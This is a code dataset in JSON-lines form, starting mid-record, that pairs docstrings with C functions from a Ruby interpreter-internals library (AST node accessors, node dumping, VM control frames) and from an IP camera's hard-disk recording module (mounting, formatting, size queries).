NEN_ORIG:\n      switch(TYPE(n->nd_orig))\n      {\n        case T_CLASS:\n        case T_MODULE:\n        {\n          /* When dumping a class, we dump just the name (otherwise we'd\n           * get multiple copies of the class each time we load a method\n           * on the other side).\n           */\n          VALUE klass = (VALUE)n->nd_orig;\n          VALUE path;\n          if(FL_TEST(klass, FL_SINGLETON))\n          {\n            VALUE singleton = rb_iv_get(klass, \"__attached__\");\n            path = rb_class_path(singleton);\n          }\n          else\n          {\n            path = rb_class_path(klass);\n            if(StringValuePtr(path)[0] == '#')\n            {\n              rb_raise(rb_eArgError, \"cannot dump anonymous class\");\n            }\n          }\n          return rb_assoc_new(\n              INT2NUM(((struct RBasic *)(n->nd_orig))->flags),\n              path);\n        }\n\n        case T_NODE:\n          rb_raise(\n              rb_eRuntimeError,\n              \"Wrong node elem orig for node type %d\",\n              nd_type(n));\n        \n        default:\n          /* TODO: would like to dump flags, not type */\n          return rb_assoc_new(\n              INT2NUM(TYPE((VALUE)n->nd_orig)),\n              (VALUE)n->nd_orig);\n      }\n    case NEN_RECV:\n      if(n->nd_recv)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_recv);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_recv,\n          node_type,\n          node_hash);\n        return node_id(n->nd_recv);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_RESQ:\n      if(n->nd_resq)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_resq);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_resq,\n          node_type,\n          node_hash);\n        return node_id(n->nd_resq);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_REST:\n      {\n      return LONG2NUM((long)n->nd_rest);\n      }\n    case NEN_RVAL:\n      if(n->nd_2nd)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_2nd);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_2nd,\n          node_type,\n          node_hash);\n        return node_id(n->nd_2nd);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_STATE:\n      {\n      return LONG2NUM((long)n->nd_state);\n      }\n    case NEN_STTS:\n      if(n->nd_stts)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_stts);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_stts,\n          node_type,\n          node_hash);\n        return node_id(n->nd_stts);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_SUPER:\n      if(n->nd_super)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_super);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_super,\n          node_type,\n          node_hash);\n        return node_id(n->nd_super);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_TAG:\n      if(n->nd_tag == 0)\n      {\n        return Qfalse;\n      }\n      else if(n->nd_tag == 1)\n      {\n        return Qtrue;\n      }\n      else\n      {\n        return ID2SYM(n->nd_tag);\n      }\n    case NEN_TBL:\n      {\n      VALUE v = variable_names(n->nd_tbl);\n      return v;\n      }\n    case NEN_TVAL:\n      switch(TYPE(n->nd_tval))\n      {\n        case T_CLASS:\n        case T_MODULE:\n        {\n          /* When dumping a class, we dump just the name (otherwise we'd\n           * get multiple copies of the class each time we load a method\n           * on the other side).\n           */\n          VALUE klass = (VALUE)n->nd_tval;\n          VALUE path;\n          if(FL_TEST(klass, FL_SINGLETON))\n          {\n            VALUE singleton = rb_iv_get(klass, \"__attached__\");\n            path = rb_class_path(singleton);\n          }\n          else\n          {\n            path = rb_class_path(klass);\n            if(StringValuePtr(path)[0] == '#')\n            {\n              rb_raise(rb_eArgError, \"cannot dump anonymous class\");\n            }\n          }\n          return rb_assoc_new(\n              INT2NUM(((struct RBasic *)(n->nd_tval))->flags),\n              path);\n        }\n\n        case T_NODE:\n          rb_raise(\n              rb_eRuntimeError,\n              \"Wrong node elem tval for node type %d\",\n              nd_type(n));\n        \n        default:\n          /* TODO: would like to dump flags, not type */\n          return rb_assoc_new(\n              INT2NUM(TYPE((VALUE)n->nd_tval)),\n              (VALUE)n->nd_tval);\n      }\n    case NEN_VALUE:\n      if(n->nd_value)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_value);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_value,\n          node_type,\n          node_hash);\n        return node_id(n->nd_value);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_VAR:\n      if(n->nd_var)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_var);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_var,\n          node_type,\n          node_hash);\n        return node_id(n->nd_var);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_VID:\n      if(n->nd_vid == 0)\n      {\n        return Qfalse;\n      }\n      else if(n->nd_vid == 1)\n      {\n        return Qtrue;\n      }\n      else\n      {\n        return ID2SYM(n->nd_vid);\n      }\n  }\n  rb_raise(rb_eArgError, \"Invalid Node_Elem_Name %d\", nen);\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/* For Ludicrous */\n", "func_signal": "void ruby_set_current_thread_tag(void * tag)", "code": "{\n  VALUE thread = rb_thread_current();\n  rb_thread_t * th;\n  GetThreadPtr(thread, th);\n  th->tag = tag;\n}", "path": "ext\\internal\\thread\\thread.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _stts_ member.  The return type is\n * either a Node or an Object.\n */\n", "func_signal": "static VALUE node_stts(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n\n  if(TYPE(n->nd_stts) == T_NODE)\n  {\n    if(0 && nd_type(n) == NODE_OP_ASGN2)\n    {\n      return wrap_node_as(\n        (NODE *)n->nd_stts,\n        rb_cNodeSubclass[NODE_OP_ASGN2_ARG]);\n    }\n    else\n    {\n      return wrap_node((NODE *)n->nd_stts);\n    }\n  }\n  else\n  {\n    return (VALUE)n->nd_stts;\n  }\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * call-seq:\n *   thread.cfp = RubyVM::ControlFrame\n *\n * Returns the thread's control frame.\n */\n", "func_signal": "static VALUE thread_cfp(VALUE self)", "code": "{\n  rb_thread_t * th;\n  rb_control_frame_t * prev_cfp;\n\n  GetThreadPtr(self, th);\n\n  /* TODO: Not sure how many control frames back to go to get the one we\n   * want */\n  prev_cfp = RUBY_VM_PREVIOUS_CONTROL_FRAME(th->cfp);\n  if((void *)(th->stack + th->stack_size) == (void *)prev_cfp)\n  {\n    return Qnil;\n  }\n  else\n  {\n    struct RubyInternalControlFrame * cfp;\n    VALUE cfp_v;\n\n    cfp_v = Data_Make_Struct(\n        rb_cVmControlFrame,\n        struct RubyInternalControlFrame,\n        mark_ruby_internal_control_frame,\n        free, \n        cfp);\n\n    cfp->control_frame = prev_cfp;\n    cfp->thread = self;\n\n    return cfp_v;\n  }\n}", "path": "ext\\internal\\thread\\thread.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * call-seq:\n *   control_frame.prev => RubyVM::ControlFrame\n *\n * Return the frame's prev member.\n */\n", "func_signal": "static VALUE control_frame_prev(VALUE control_frame)", "code": "{\n  struct RubyInternalControlFrame * cfp;\n  rb_thread_t * th;\n  rb_control_frame_t * prev_cfp;\n\n  Data_Get_Struct(control_frame, struct RubyInternalControlFrame, cfp);\n\n  GetThreadPtr(cfp->thread, th);\n\n  prev_cfp = RUBY_VM_PREVIOUS_CONTROL_FRAME(cfp->control_frame);\n\n  printf(\"current: %p\\n\", cfp->control_frame);\n  printf(\"prev: %p\\n\", prev_cfp);\n  printf(\"th->stack: %p\\n\", th->stack);\n  printf(\"th->stack + th->stack_size: %p\\n\", th->stack + th->stack_size);\n\n  if((void *)(th->stack + th->stack_size) == (void *)prev_cfp)\n  {\n    return Qnil;\n  }\n  else\n  {\n    VALUE cfp_v;\n    struct RubyInternalControlFrame * new_cfp;\n\n    cfp_v = Data_Make_Struct(\n        rb_cVmControlFrame,\n        struct RubyInternalControlFrame,\n        mark_ruby_internal_control_frame,\n        free,\n        new_cfp);\n\n    new_cfp->control_frame = prev_cfp;\n    new_cfp->thread = cfp->thread;\n\n    return cfp_v;\n  }\n}", "path": "ext\\internal\\vm\\control_frame\\control_frame.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _clss_ member.  The return type is\n * either a Node or an Object.\n */\n", "func_signal": "static VALUE node_clss(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n\n  if(TYPE(n->nd_clss) == T_NODE)\n  {\n    if(0 && nd_type(n) == NODE_OP_ASGN2)\n    {\n      return wrap_node_as(\n        (NODE *)n->nd_clss,\n        rb_cNodeSubclass[NODE_OP_ASGN2_ARG]);\n    }\n    else\n    {\n      return wrap_node((NODE *)n->nd_clss);\n    }\n  }\n  else\n  {\n    return (VALUE)n->nd_clss;\n  }\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _iter_ member.  The return type is\n * either a Node or an Object.\n */\n", "func_signal": "static VALUE node_iter(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n\n  if(TYPE(n->nd_iter) == T_NODE)\n  {\n    if(0 && nd_type(n) == NODE_OP_ASGN2)\n    {\n      return wrap_node_as(\n        (NODE *)n->nd_iter,\n        rb_cNodeSubclass[NODE_OP_ASGN2_ARG]);\n    }\n    else\n    {\n      return wrap_node((NODE *)n->nd_iter);\n    }\n  }\n  else\n  {\n    return (VALUE)n->nd_iter;\n  }\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _value_ member.  The return type is\n * either a Node or an Object.\n */\n", "func_signal": "static VALUE node_value(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n\n  if(TYPE(n->nd_value) == T_NODE)\n  {\n    if(0 && nd_type(n) == NODE_OP_ASGN2)\n    {\n      return wrap_node_as(\n        (NODE *)n->nd_value,\n        rb_cNodeSubclass[NODE_OP_ASGN2_ARG]);\n    }\n    else\n    {\n      return wrap_node((NODE *)n->nd_value);\n    }\n  }\n  else\n  {\n    return (VALUE)n->nd_value;\n  }\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _1st_ member.  The return type is\n * either a Node or an Object.\n */\n", "func_signal": "static VALUE node_1st(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n\n  if(TYPE(n->nd_1st) == T_NODE)\n  {\n    if(0 && nd_type(n) == NODE_OP_ASGN2)\n    {\n      return wrap_node_as(\n        (NODE *)n->nd_1st,\n        rb_cNodeSubclass[NODE_OP_ASGN2_ARG]);\n    }\n    else\n    {\n      return wrap_node((NODE *)n->nd_1st);\n    }\n  }\n  else\n  {\n    return (VALUE)n->nd_1st;\n  }\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _argc_ member.  The return type is an\n * Integer.\n */\n", "func_signal": "static VALUE node_argc(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n  return LONG2NUM(n->nd_argc);\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/******************************************************************************\n* \u01a3hd_mount_disk\n* MOUNT\u04f2\n* int disk_no\t\u04f2\u033a\n* \n*   \u05b5\u0279: 0; \u02a7: -1\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_mount_disk(int disk_no)", "code": "{\n\tint i,ret;\n\tint partition_num;\n\tchar partition_name[MAX_PATH];\n\tchar dir_name[MAX_PATH];\n\tint  type;\t\t\t\t//   1: \u0777   2: \u0777  3:   \n\tDISKSIZE disk_size;\n\n\t//pause_record_file(); \t\t// \u0363\u00bc \n\n\tif ( tm3k_HD_IsDiskFormated(tm3k_HD_GetDiskName(disk_no)) == 0 )\n\t{\t\t\n\t\tpartition_num = tm3k_HD_GetDiskPartionNum(tm3k_HD_GetDiskName(disk_no));\n\t\t\n\t\tfor (i=0; i<partition_num; i++)\n\t\t{\n\t\t\tg_hard_disk_info.disk_info[disk_no].partition_info[i].format_flag = 1;\t//\u047e\u02bd\n\n\t\t\ttype = tm3k_HD_GetPartionVol( tm3k_HD_GetDiskName(disk_no), i + 1 );\n\t\t\t\n\t\t\tg_hard_disk_info.disk_info[disk_no].partition_info[i].type = type;\n\n\t\t\t//printf(\"hd_mount_disk==type = %d\\n\", type);\n\n\t\t\tget_partition_name(partition_name, disk_no, i);\n\t\t\t\n\t\t\tsprintf(dir_name,\"/record/hd%02d/%02d\",disk_no,i);\n\t\t\t\n\t\t\tret = hd_mount_partition(partition_name,dir_name);\n\t\t\tif (ret == 0)\n\t\t\t{\n\t\t\t\tg_hard_disk_info.disk_info[disk_no].partition_info[i].mount_flag = 1;\n\t\t\t\ttm3k_HD_GetDiskInfo(partition_name, &disk_size);\n\t\t\t\tg_hard_disk_info.disk_info[disk_no].partition_info[i].availabe_size = disk_size.availablesize;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t// \u00b9\n\t\t\t\thd_umount_partition(dir_name);\n\t\t\t\tret = hd_mount_partition(partition_name,dir_name);\n\t\t\t\tif (ret == 0)\n\t\t\t\t{\n\t\t\t\t\tg_hard_disk_info.disk_info[disk_no].partition_info[i].mount_flag = 1;\n\t\t\t\t\ttm3k_HD_GetDiskInfo(partition_name,&disk_size);\n\t\t\t\t\tg_hard_disk_info.disk_info[disk_no].partition_info[i].availabe_size = disk_size.availablesize;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\tg_hard_disk_info.disk_info[disk_no].partition_info[0].format_flag = 0;\n\t\tg_hard_disk_info.disk_info[disk_no].partition_info[1].format_flag = 0;\n\t\tg_hard_disk_info.disk_info[disk_no].partition_info[0].mount_flag = 0;\n\t\tg_hard_disk_info.disk_info[disk_no].partition_info[1].mount_flag = 0;\n\t}\n\n\t//restart_record_file(); // \u00bf\u02bc\u00bc \n\n\treturn 0;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3hd_get_backup_partition_num\n* \u0221\u0777(mount\u0279\u0131)\n* \n* \n*   \u05b5\u05b5\u0777\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_get_backup_partition_num()", "code": "{\n\tint i;\n\tint backup_partition_num;\n\n\tbackup_partition_num = 0;\n\tfor (i=0; i<MAX_DISK_NUM; i++)\n\t{\n\t\tif (g_hard_disk_info.disk_info[i].partition_info[1].mount_flag)\n\t\t\tbackup_partition_num++;\n\t}\n\n\treturn backup_partition_num;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3hd_get_partition_total_size\n* \u0221\n* int disk_no\t\t\t\u04f2\u033a\n*\t\t\tint partition_no\t\n* \n*   \u05b5\u05b5\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_get_partition_total_size(int disk_no,int partition_no)", "code": "{\n\tchar partition_name[MAX_PATH];\n\tDISKSIZE disk_size;\n\n\tget_partition_name(partition_name,disk_no,partition_no);\n\ttm3k_HD_GetDiskInfo(partition_name,&disk_size);\n\n\tg_hard_disk_info.disk_info[disk_no].partition_info[partition_no].availabe_size = disk_size.availablesize;\n\n\treturn disk_size.totalsize;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3hd_format\n* \u02bd\u04bb\n* int disk_no\t\t\t\t\u04f2\u033a\n*\t\t\tint partition_no\t\t\n* \n*   \u05b5\u0279:0; \u02a7: -1\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_format(int disk_no,int partition_no)", "code": "{\n\tint ret;\n\tint partition_num;\n\tint disk_num;\n\n\tint cur_disk_no;\n\tint cur_partition_no;\n\tchar dir_name[MAX_PATH];\n\tchar dev_name[MAX_PATH];\n\n\tcur_disk_no = g_hard_disk_info.cur_disk_no;\n\tcur_partition_no = g_hard_disk_info.cur_partition_no;\n\n\tpartition_num = tm3k_HD_GetDiskPartionNum(tm3k_HD_GetDiskName(disk_no));\n\tif ( partition_no > (partition_num -1) )\n\t{\n\t\treturn -3;\n\t}\n\n\tdisk_num = get_hard_disk_num();\n\tif ( disk_no > (disk_num - 1) )\n\t{\n\t\treturn -4;\n\t}\n\n\tif ( (disk_no == cur_disk_no) && (partition_no == cur_partition_no) )\n\t{\n\t\t//\u0363\u00bc\n\t\t//pause_record_file();\n\t\t\n\t\tsprintf(dir_name,\"/record/hd%02d/%02d\",disk_no, partition_no);\n\t\tif (g_hard_disk_info.disk_info[disk_no].partition_info[partition_no].mount_flag == 1)\n\t\t{\n\t\t\tret = hd_umount_partition(dir_name);\t\t// umount\u00f7 \n\t\t\tif (ret != 0)\n\t\t\t{\n\t\t\t\t//\u05b8\u00bc\n\t\t\t\t//restart_record_file();\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t}\n\n\t\tret = tm3k_HD_Format(tm3k_HD_GetDiskName(disk_no), partition_no + 1);\n\n\t\tget_partition_name(dev_name, disk_no, partition_no);\n\n\t\thd_mount_partition(dev_name,dir_name);\n\n\t\t//\u05b8\u00bc\n\t\t//restart_record_file();\n\t}\n\telse\n\t{\n\t\tsprintf(dir_name,\"/record/hd%02d/%02d\",disk_no, partition_no);\n\t\tif (g_hard_disk_info.disk_info[disk_no].partition_info[partition_no].mount_flag == 1)\n\t\t{\n\t\t\tret = hd_umount_partition(dir_name);\t\t// umount\u00f7 \n\t\t\tif (ret != 0)\n\t\t\t{\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t}\n\n\t\tret = tm3k_HD_Format(tm3k_HD_GetDiskName(disk_no), partition_no + 1);\n\t\t\n\t\tget_partition_name(dev_name, disk_no, partition_no);\n\t\t\n\t\thd_mount_partition(dev_name,dir_name);\n\t}\n\n\treturn ret;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3hd_query_disk_info\n* \u02b1\u046f\u04f2\u03e2(mainMenuDlg.c\u06b6\u02b1\u0435)\n* \n* \n*   \u05b52: \u04f2\u0363\u00bc,\u027e\u013c\n*\t\t\t1: \u04f2\u0363\u00bc,\u02be\n*\t\t\t0: \n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_query_disk_info()", "code": "{\n\tint cur_disk_no;\n\tint cur_partition_no;\n\tint cover_mode = 0;\n\tint ret = 0;\n\tint disk_num = 0;\n\tcur_disk_no = g_hard_disk_info.cur_disk_no;\n\tcur_partition_no = g_hard_disk_info.cur_partition_no;\n\n\tdisk_num = get_hard_disk_num();\n\tif (disk_num <= 0)\n\t{\n\t\treturn -1;\n\t}\n\t\t\n\tif (hd_cur_partition_full(cur_disk_no,cur_partition_no))\t// \u01f0 \n\t{\n\t\tif (get_del_file_status() == 1)\t\t\t\t\t//\u027e\u013c\n\t\t{\n\t\t\treturn 0;\n\t\t}\n\n\t\tif (hd_find_empty_partition(&cur_disk_no, &cur_partition_no) == 0) // \u04bb\u0575\u0137 \n\t\t{\n\t\t\tg_hard_disk_info.cur_disk_no = cur_disk_no;\n\t\t\tg_hard_disk_info.cur_partition_no = cur_partition_no;\n\n\t\t\tif(g_file_delete_status == 1)\n\t\t\t{\n\t\t\t\tg_file_delete_status = 0;\n\t\t\t}\n\t\t}\n\t\telse // \u00fb\u04f2\u033f\u057c,\u0363\u05b9\u00bc\u07f8\u03f5\u00bc\u013c \n\t\t{\n\t\t\t//cover_mode = getRecordCoverMode(); // [zhb][add][2006-03-01]\n\t\t\tif (cover_mode == 0)\n\t\t\t{\n\t\t\t\t//\u027e\u013c\n\t\t\t\tdel_oldest_record_file();\n\t\t\t\t\n\t\t\t\tg_file_delete_status = 1;\n\n\t\t\t\tret = 2;\t\t\t\t//\u04f2\u0363\u00bc,\u027e\u013c \n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t//\u0363\u03f5\u0373\n\t\t\t\tg_file_delete_status = 1;\n\t\t\t\t//nvsRecorderPause();\n\t\t\t\tret = 1;\t\t\t\t//\u04f2\u0363\u00bc,\u02be   \n\t\t\t}\n\t\t}\n\t}\n\telse\t\t// \u01f0\u03b4 \n\t{\n\t\tif (g_file_delete_status == 1)\n\t\t{\n\t\t\tg_file_delete_status = 0;\n\t\t}\n\t\tret = 3;\n\t}\n\treturn ret;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3hd_get_backup_disk_no\n* \u0368\u0777\u00f1\u04f2\u033a\n* int backup_partition_no\t\t\u0777\n* \n*   \u05b5\u0279\u04f2\u033a; \u02a7\u0723-1\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_get_backup_disk_no(int backup_partition_no)", "code": "{\n\tint i;\n\tint backup_partition_num;\n\tint disk_no;\n\tint partition_no;\n\n\tbackup_partition_num = hd_get_backup_partition_num();\n\tif (backup_partition_num <= 0 || backup_partition_no >= backup_partition_num)\n\t\treturn -1;\n\n\tdisk_no = -1;\n\tpartition_no = -1;\n\tfor (i=0; i<MAX_DISK_NUM; i++)\t\t//backup_partition_num\n\t{\n\t\tif (g_hard_disk_info.disk_info[i].partition_info[1].mount_flag)\n\t\t\tpartition_no++;\n\n\t\tif (partition_no == backup_partition_no)\n\t\t{\n\t\t\tdisk_no = i;\n\t\t\treturn  disk_no;\n\t\t}\n\t}\n\n\treturn disk_no;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3hd_umount_all_partition\n* UMOUNT\u04f2\u0335\u0437\n* \n* \n*   \u05b50\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_umount_all_partition()", "code": "{\n\tint i;\n\tint disk_num;\n\n\tdisk_num = tm3k_HD_GetDiskNum();\n\t\n\tif (disk_num == 0)\n\t{\n\t\tg_hard_disk_info.hard_disk_num = disk_num;\n\t\treturn -1;\n\t}\n\t\n\tfor(i=0; i<disk_num; i++)\n\t{\n\t\thd_umount_disk(i); // umount i\u04f2 \n\t}\n\n\treturn 0;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3hd_get_disk_available_size\n* \u0221\u04f2\u0335\u013f\u00ff\u057c\n* \n* \n*   \u05b5\u05b5\u04f2\u0335\u013f\u00ff\u057c\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_get_disk_available_size()", "code": "{\n\tint i,j;\n\tint disk_num;\n\tint partition_num;\n\tint available_size = 0;\n\n\tdisk_num = get_hard_disk_num();\n\t\n\tfor(i=0; i<disk_num; i++)\n\t{\n\t\tpartition_num = tm3k_HD_GetDiskPartionNum(tm3k_HD_GetDiskName(i));\n\t\tfor(j=0; j<partition_num; j++)\n\t\t{\n\t\t\tavailable_size += hd_get_partition_available_size(i,j);\n\t\t}\n\t}\n\n\treturn available_size;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3hd_get_disk_used_size\n* \u0221\u04f2\u0335\u00ff\u057c\n* \n* \n*   \u05b5\u05b5\u04f2\u0335\u00ff\u057c\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_get_disk_used_size()", "code": "{\n\tint i,j;\n\tint disk_num;\n\tint partition_num;\n\tint used_size = 0;\n\n\tdisk_num = get_hard_disk_num();\n\t\n\tfor(i=0; i<disk_num; i++)\n\t{\n\t\tpartition_num = tm3k_HD_GetDiskPartionNum(tm3k_HD_GetDiskName(i));\n\t\tfor(j=0; j<partition_num; j++)\n\t\t{\n\t\t\tused_size += hd_get_partition_used_size(i,j);\n\t\t}\n\t}\n\t\n\tg_hard_disk_info.hard_disk_num = disk_num;\n\t\n\treturn used_size;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3int hd_get_disk_total_size\n* \u0221\u04f2\n* \n* \n*   \u05b5\u05b5\u04f2\n* \u07b8\u013c\u00bc: \n* \u02f5: \n\n********************************************************************************/\n", "func_signal": "int hd_get_disk_total_size()", "code": "{\n\tint i,j;\n\tint disk_num;\n\tint partition_num;\n\tint total_size = 0;\n\n\tdisk_num = get_hard_disk_num();\n\tfor(i=0; i<disk_num; i++)\n\t{\n\t\tpartition_num = tm3k_HD_GetDiskPartionNum(tm3k_HD_GetDiskName(i));\n\t\tfor(j=0; j<partition_num; j++)\n\t\t{\n\t\t\ttotal_size += hd_get_partition_total_size(i,j);\n\t\t}\n\t}\n\n\treturn total_size;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
